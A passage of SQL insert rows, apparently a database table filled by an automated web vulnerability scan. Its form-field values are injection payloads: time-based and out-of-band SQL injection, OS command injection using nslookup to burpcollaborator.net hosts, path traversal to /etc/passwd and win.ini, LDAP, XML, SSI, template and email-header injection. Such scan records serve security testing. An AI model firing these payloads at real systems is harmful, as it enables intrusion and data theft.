('', 301, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'+sleep(20.to_i)+\'', '112309'),
('', 302, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'+eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))+\'', '112309'),
('', 303, '840636', 'RyFsGciC@burpcollaborator.net', 'eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))', '112309'),
('', 304, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'.sleep(20).\'', '112309'),
('', 305, '840636', 'RyFsGciC@burpcollaborator.net', '637007{${sleep(20)}}', '112309'),
('', 306, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 307, '840636', 'RyFsGciC@burpcollaborator.net', 'mlb65qp52vilg4nsf16x7ggyzp5it9vxnlf87ww.burpcollaborator.net', '112309'),
('', 308, '840636', 'RyFsGciC@burpcollaborator.net', 'http://s92ctwdbq16r4aby37u3vm44nvtohfj39r1et2i.burpcollaborator.net/?637007', '112309'),
('', 309, '840636', 'RyFsGciC@burpcollaborator.net', 'nslookup -q=cname ld25xph4uuak83fr70ywzf8xroxhl8nwgz4rrjf8.burpcollaborator.net.&', '112309'),
('', 310, '840636', 'RyFsGciC@burpcollaborator.net', '637007|nslookup -q=cname a6huqeatnj391s8g0prls41mkdq6exglc94wwkl.burpcollaborator.net.&', '112309'),
('', 311, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'\"`0&nslookup -q=cname l5r5pp94mu2k037rz0qwrf0xjophd8fwck47wvl.burpcollaborator.net.&`\'', '112309'),
('', 312, '840636', 'RyFsGciC@burpcollaborator.net', '637007&nslookup -q=cname thed1xlcy2escbjzb8243nc5vw1ppgr4msef63v.burpcollaborator.net.&\'\\\"`0&nslookup -q=cname thed1xlcy2escbjzb8243nc5vw1ppgr4msef63v.burpcollaborator.net.&`\'', '112309'),
('', 313, '840636', 'RyFsGciC@burpcollaborator.net', '637007|echo pmsqxi22g3 a6lp6saafr||a #\' |echo pmsqxi22g3 a6lp6saafr||a #|\" |echo pmsqxi22g3 a6lp6saafr||a #', '112309'),
('', 314, '840636', 'RyFsGciC@burpcollaborator.net', '637007&echo jftqjngpko 83b090p8ju&', '112309'),
('', 315, '840636', 'RyFsGciC@burpcollaborator.net', '637007\"|echo 1dk2ikld66 0yavy15y3i ||', '112309'),
('', 316, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'|echo i1266s3mrk yzh3jr44au #xzwx', '112309'),
('', 317, '840636', 'RyFsGciC@burpcollaborator.net', '637007|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1', '112309'),
('', 318, '840636', 'RyFsGciC@burpcollaborator.net', '637007|ping -c 21 127.0.0.1||x', '112309'),
('', 319, '840636', 'RyFsGciC@burpcollaborator.net', '637007&ping -n 21 127.0.0.1&', '112309'),
('', 320, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'|ping -c 21 127.0.0.1 #', '112309'),
('', 321, '840636', 'RyFsGciC@burpcollaborator.net', '637007\"|ping -n 21 127.0.0.1 ||', '112309'),
('', 322, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 323, '840636', 'RyFsGciC@burpcollaborator.net', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', '112309'),
('', 324, '840636', 'RyFsGciC@burpcollaborator.net', 'c:\\windows\\win.ini', '112309'),
('', 325, '840636', 'RyFsGciC@burpcollaborator.net', '../../../../../../../../../../../../../../../../windows/win.ini', '112309'),
('', 326, '840636', 'RyFsGciC@burpcollaborator.net', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini', '112309'),
('', 327, '840636', 'RyFsGciC@burpcollaborator.net', '../../../../../../../../../../../../../../../../winnt/win.ini', '112309'),
('', 328, '840636', 'RyFsGciC@burpcollaborator.net', '\\windows\\win.ini', '112309'),
('', 329, '840636', 'RyFsGciC@burpcollaborator.net', 'file:///c:/windows/win.ini', '112309'),
('', 330, '840636', 'RyFsGciC@burpcollaborator.net', '...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini', '112309'),
('', 331, '840636', 'RyFsGciC@burpcollaborator.net', '.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini', '112309'),
('', 332, '840636', 'RyFsGciC@burpcollaborator.net', '...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini', '112309'),
('', 333, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 334, '840636', 'RyFsGciC@burpcollaborator.net', 'windowswin.ini', '112309'),
('', 335, '840636', 'RyFsGciC@burpcollaborator.net', '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini', '112309'),
('', 336, '840636', 'RyFsGciC@burpcollaborator.net', '637007..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', '112309'),
('', 337, '840636', 'RyFsGciC@burpcollaborator.net', '637007../../../../../../../../../../../../../../../../windows/win.ini', '112309'),
('', 338, '840636', 'RyFsGciC@burpcollaborator.net', '637007..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini', '112309'),
('', 339, '840636', 'RyFsGciC@burpcollaborator.net', '637007../../../../../../../../../../../../../../../../winnt/win.ini', '112309'),
('', 340, '840636', 'RyFsGciC@burpcollaborator.net', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini637007', '112309'),
('', 341, '840636', 'RyFsGciC@burpcollaborator.net', 'c:\\windows\\win.ini637007', '112309'),
('', 342, '840636', 'RyFsGciC@burpcollaborator.net', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini637007', '112309'),
('', 343, '840636', 'RyFsGciC@burpcollaborator.net', '../../../../../../../../../../../../../../../../etc/passwd', '112309'),
('', 344, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 345, '840636', 'RyFsGciC@burpcollaborator.net', '/etc/passwd', '112309'),
('', 346, '840636', 'RyFsGciC@burpcollaborator.net', 'file:///etc/passwd', '112309'),
('', 347, '840636', 'RyFsGciC@burpcollaborator.net', '..././..././..././..././..././..././..././..././..././..././etc/passwd', '112309'),
('', 348, '840636', 'RyFsGciC@burpcollaborator.net', 'etcpasswd', '112309'),
('', 349, '840636', 'RyFsGciC@burpcollaborator.net', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '112309'),
('', 350, '840636', 'RyFsGciC@burpcollaborator.net', '637007../../../../../../../../../../../../../../../../etc/passwd', '112309'),
('', 351, '840636', 'RyFsGciC@burpcollaborator.net', '../../../../../../../../../../../../../../../../etc/passwd637007', '112309'),
('', 352, '840636', 'RyFsGciC@burpcollaborator.net', '.../637007', '112309'),
('', 353, '840636', 'RyFsGciC@burpcollaborator.net', './contact', '112309'),
('', 354, '840636', 'RyFsGciC@burpcollaborator.net', '/./contact', '112309'),
('', 355, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 356, '840636', 'RyFsGciC@burpcollaborator.net', 'lgtfmzecic)(objectClass=*', '112309'),
('', 357, '840636', 'RyFsGciC@burpcollaborator.net', '855pl7b657)(!(objectClass=*)', '112309'),
('', 358, '840636', 'RyFsGciC@burpcollaborator.net', '*)(objectClass=*', '112309'),
('', 359, '840636', 'RyFsGciC@burpcollaborator.net', '*)(!(objectClass=*)', '112309'),
('', 360, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 361, '840636', 'RyFsGciC@burpcollaborator.net', '<lfc xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://x75hr1bgo64w2f931cs8tr29l0rtfkh8hw9j17q.burpcollaborator.net/lfc.xsd\">lfc</lfc>', '112309'),
('', 362, '840636', 'RyFsGciC@burpcollaborator.net', '<qcz xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://at7udextajq9osvgnpelf4om7dd61x3l49wwokd.burpcollaborator.net/foo\"/></qcz>', '112309'),
('', 363, '840636', 'RyFsGciC@burpcollaborator.net', '637007]]>><', '112309'),
('', 364, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 365, '840636', 'RyFsGciC@burpcollaborator.net', '(function(){if(typeof mbu4s===\'undefined\'){var a=new Date();do{var b=new Date();}while(b-a<20000);mbu4s=1;}}())', '112309'),
('', 366, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'+(function(){if(typeof ycjic===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);ycjic=1;}}())+\'', '112309'),
('', 367, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 368, '840636', 'RyFsGciC@burpcollaborator.net', '\"-->\'-->`--><!--#set var=\"rwd\" value=\"qvcafuz9cz\"--><!--#set var=\"tyf\" value=\"sxechw1be1\"--><!--#echo var=\"rwd\"--><!--#echo var=\"tyf\"--><!--#exec cmd=\"nslookup -q=cname dizx2hmwzmfcdvkjcs3o47dpwg29q0sokm8ev6jv.burpcollaborator.net\" -->', '112309'),
('', 369, '840636', 'RyFsGciC@burpcollaborator.net', '637007\r\nBCC:yvxif2zhc7sxqgx4pdg9hsqa91fu3l59x2lu8mwb@burpcollaborator.net\r\nscm: n', '112309'),
('', 370, '840636', 'RyFsGciC@burpcollaborator.net', '637007>\r\nBCC:old85sp72xing6nuf36z7ig0zr5ktbvzntblydm2@burpcollaborator.net\r\nzly: s', '112309'),
('', 371, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 372, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ddvan SYSTEM \"http://4sxoc8wn9dp3nmuamjdfeyng67c00r2f53xqqef.burpcollab\'||\'orator.net/\">%ddvan;]>\'),\'/l\') from dual)'),
('', 373, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'||(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ddvan SYSTEM \"http://m5s6pq95mv2l047sz1qxrg0yjppid9fxjlb84wt.burpcollab\'||\'orator.net/\">%ddvan;]>\'),\'/l\') from dual)||\''),
('', 374, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309;declare @q varchar(99);set @q=\'\\\\a7iurebtoj492s9g1pslt42mldr6fxhl8bw3jw7l.burpcollab\'+\'orator.net\\juz\'; exec master.dbo.xp_dirtree @q;-- '),
('', 375, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\';declare @q varchar(99);set @q=\'\\\\dxexhh1wemucsvzjrsioj7spbgh9507oyfm790xp.burpcollab\'+\'orator.net\\thp\'; exec master.dbo.xp_dirtree @q;-- '),
('', 376, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309);declare @q varchar(99);set @q=\'\\\\vtsfdzxea4quodv1nae6fpo77ydr1i36uyiq5jt8.burpcollab\'+\'orator.net\\pze\'; exec master.dbo.xp_dirtree @q;-- '),
('', 377, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\');declare @q varchar(99);set @q=\'\\\\f2izmj6yjozexx4lwunqo9xrgimba2cq3jrbe42t.burpcollab\'+\'orator.net\\iwm\'; exec master.dbo.xp_dirtree @q;-- '),
('', 378, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '(select load_file(\'\\\\\\\\chxw1glvylebcujibr2n36covf18pzrnip6htahz.burpcollaborator.net\\\\uug\'))'),
('', 379, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'+(select load_file(\'\\\\\\\\m2p6mq65jvzlx44sw1nxogxygpmia9cx30rsel2a.burpcollaborator.net\\\\qiv\'))+\''),
('', 380, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\''),
('', 381, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\''),
('', 382, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 383, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'\''),
('', 384, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'\''),
('', 385, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '(select*from(select(sleep(20)))a)'),
('', 386, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'(select*from(select(sleep(20)))a)\''),
('', 387, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309+(select*from(select(sleep(20)))a)+'),
('', 388, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'+(select*from(select(sleep(20)))a)+\''),
('', 389, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309 and (select*from(select(sleep(20)))a)-- '),
('', 390, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\' and (select*from(select(sleep(20)))a)-- '),
('', 391, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309,(select*from(select(sleep(20)))a)'),
('', 392, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309 waitfor delay\'0:0:20\'--'),
('', 393, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\' waitfor delay\'0:0:20\'--'),
('', 394, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309)waitfor delay\'0:0:20\'--'),
('', 395, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 396, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\')waitfor delay\'0:0:20\'--'),
('', 397, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309,0)waitfor delay\'0:0:20\'--'),
('', 398, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\',0)waitfor delay\'0:0:20\'--'),
('', 399, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230963003335 or 9661=09661'),
('', 400, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230943636781 or 7890=7897'),
('', 401, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230982841293 or 8402=08402-- '),
('', 402, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230959302219 or 9893=9902-- '),
('', 403, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309 and 9208=09208'),
('', 404, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309 and 9246=9247'),
('', 405, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309 and 5142=05142-- '),
('', 406, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309 and 3760=3760-- '),
('', 407, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230980876781\' or \'4869\'=\'4871'),
('', 408, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230997042838\' or \'5431\'=\'5431'),
('', 409, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230997112290\' or 2884=2884-- '),
('', 410, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '11230954755458\' or 8547=8555-- '),
('', 411, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\' and \'1285\'=\'1285'),
('', 412, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\' and \'3188\'=\'3188'),
('', 413, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\' and \'1201\'=\'1201\''),
('', 414, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\' and 6083=6083-- '),
('', 415, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\' and 9013=9016-- '),
('', 416, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\"'),
('', 417, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'knzqoavn0w'),
('', 418, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309hl9kkpw3pa'),
('', 419, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'yil9h${707*347}j5mmw'),
('', 420, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'xv8vw{{779*888}}v97ic'),
('', 421, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309}}yh4pv\'/\"<wyhma'),
('', 422, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309%}trfdh\'/\"<obzzg'),
('', 423, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309jb5wx%>hr4qf\'/\"<sf6uq'),
('', 424, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'+sleep(20.to_i)+\''),
('', 425, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'+eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))+\''),
('', 426, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))'),
('', 427, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'.sleep(20).\''),
('', 428, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309{${sleep(20)}}'),
('', 429, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 430, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'vedfyziev4bu9dg18az60p97syyrmio6gu8h15q.burpcollaborator.net'),
('', 431, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'http://i8r2smc1pr5h30ao2xttuc3umlseg5it8h04tsi.burpcollaborator.net/?112309'),
('', 432, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'nslookup -q=cname jh431nl2yseic1jpby2u3dcvvm1fp6rukx8pvij7.burpcollaborator.net.&'),
('', 433, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309|nslookup -q=cname uuseeyydb3rtpcw0o9f5gop68xeq2h450tsgl4a.burpcollaborator.net.&'),
('', 434, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'\"`0&nslookup -q=cname 6u1qeaypbfr5powcolfhg0pi89e22t4h15tsmgb.burpcollaborator.net.&`\''),
('', 435, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309&nslookup -q=cname j1l3ln52isyiw13pvymundwvfmlf96bu6iy5rtg.burpcollaborator.net.&\'\\\"`0&nslookup -q=cname j1l3ln52isyiw13pvymundwvfmlf96bu6iy5rtg.burpcollaborator.net.&`\''),
('', 436, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309|echo zll2edaq9t rbz2ati6er||a #\' |echo zll2edaq9t rbz2ati6er||a #|\" |echo zll2edaq9t rbz2ati6er||a #'),
('', 437, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309&echo s4oy78oz1k nfo1s6jckt&'),
('', 438, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\"|echo l2e5uvypob ak2dyfg3ez ||'),
('', 439, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'|echo u11oiiu8ls ks2r1alpi2 #xzwx'),
('', 440, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1'),
('', 441, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309|ping -c 21 127.0.0.1||x'),
('', 442, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309&ping -n 21 127.0.0.1&'),
('', 443, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'|ping -c 21 127.0.0.1 #'),
('', 444, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\"|ping -n 21 127.0.0.1 ||'),
('', 445, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 446, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini'),
('', 447, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'c:\\windows\\win.ini'),
('', 448, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '../../../../../../../../../../../../../../../../windows/win.ini'),
('', 449, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini'),
('', 450, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '../../../../../../../../../../../../../../../../winnt/win.ini'),
('', 451, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '\\windows\\win.ini'),
('', 452, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'file:///c:/windows/win.ini'),
('', 453, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini'),
('', 454, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini'),
('', 455, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini'),
('', 456, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 457, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'windowswin.ini'),
('', 458, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini'),
('', 459, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309../../../../../../../../../../../../../../../../windows/win.ini'),
('', 460, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini'),
('', 461, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309../../../../../../../../../../../../../../../../winnt/win.ini'),
('', 462, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini112309'),
('', 463, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'c:\\windows\\win.ini112309'),
('', 464, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini112309'),
('', 465, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '../../../../../../../../../../../../../../../../etc/passwd'),
('', 466, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 467, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '/etc/passwd'),
('', 468, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'file:///etc/passwd'),
('', 469, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '..././..././..././..././..././..././..././..././..././..././etc/passwd'),
('', 470, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'etcpasswd'),
('', 471, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'),
('', 472, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309../../../../../../../../../../../../../../../../etc/passwd'),
('', 473, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '../../../../../../../../../../../../../../../../etc/passwd112309'),
('', 474, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '.../112309'),
('', 475, '840636', 'RyFsGciC@burpcollaborator.net', '637007', './contact'),
('', 476, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '/./contact'),
('', 477, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 478, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'c0rgsu8nck)(!(objectClass=*)'),
('', 479, '840636', 'RyFsGciC@burpcollaborator.net', '637007', 'ypjr9ay44o)(!(!(objectClass=*))'),
('', 480, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '*)(objectClass=*'),
('', 481, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '*)(!(objectClass=*)'),
('', 482, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 483, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '<gte xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://x20hm16gj6zwxf43wcn8orx9g0mtakc8cw4jx7m.burpcollaborator.net/gte.xsd\">gte</gte>'),
('', 484, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '<tdp xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://rzubjv3ag0wqu91xt6k2llu3dujn7e92aq2dv1k.burpcollaborator.net/foo\"/></tdp>'),
('', 485, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309]]>><'),
('', 486, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 487, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '(function(){if(typeof njw9b===\'undefined\'){var a=new Date();do{var b=new Date();}while(b-a<20000);njw9b=1;}}())'),
('', 488, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\'+(function(){if(typeof eapng===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);eapng=1;}}())+\''),
('', 489, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 490, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '\"-->\'-->`--><!--#set var=\"set\" value=\"rdsbxvhau0\"--><!--#set var=\"ugv\" value=\"tfudzxjcw2\"--><!--#echo var=\"set\"--><!--#echo var=\"ugv\"--><!--#exec cmd=\"nslookup -q=cname e0fyki4xhnxdvw2kutlpm8vqehka81ap2nqfd81x.burpcollaborator.net\" -->'),
('', 491, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309\r\nBCC:nqh7aru67wnml5stk2bychlz4qajya0ysrgj3cr1@burpcollaborator.net\r\nahd: x'),
('', 492, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309>\r\nBCC:01zkl45ji9yzwi36vfmbnuwcf3lw9nbb35rxeq2f@burpcollaborator.net\r\neap: u'),
('', 493, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 494, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 495, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 496, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 497, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 498, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 499, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 500, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 501, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 502, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 503, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 504, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 505, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 506, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 507, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 508, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 509, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 510, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 511, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 512, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 513, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 514, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 515, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 516, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 517, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 518, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 519, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 520, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 521, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 522, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 523, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 524, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 525, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
